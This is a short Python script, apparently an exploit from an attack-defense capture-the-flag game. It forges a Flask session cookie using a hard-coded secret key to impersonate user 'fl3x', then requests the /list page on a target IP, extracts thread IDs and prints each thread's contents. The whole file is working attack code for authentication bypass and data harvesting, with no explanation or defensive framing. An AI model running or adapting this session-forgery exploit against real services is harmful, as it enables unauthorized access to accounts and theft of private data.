from flask import Flask
from flask.sessions import SecureCookieSessionInterface
import requests
import sys
import re


def get_session_cookie(data, secret_key):
    """Get session with data stored in it"""
    app = Flask("sploit")
    app.secret_key = secret_key

    session_serializer = SecureCookieSessionInterface().get_signing_serializer(app)

    return session_serializer.dumps(data)

ip = sys.argv[1]

sess = get_session_cookie({ 'id': 1, 'login': 'fl3x' }, 'gk2ptgp9mB')

r = requests.get(f"http://{ip}:5000/list", cookies={ 'session': sess })

threads = re.findall('''<a href="/threads/(.{1,4})">Thread_.+</a>''', r.text)

for i in threads:
    r = requests.get(f"http://{ip}:5000/threads/{i}", cookies={ 'session': sess })
    print(r.text)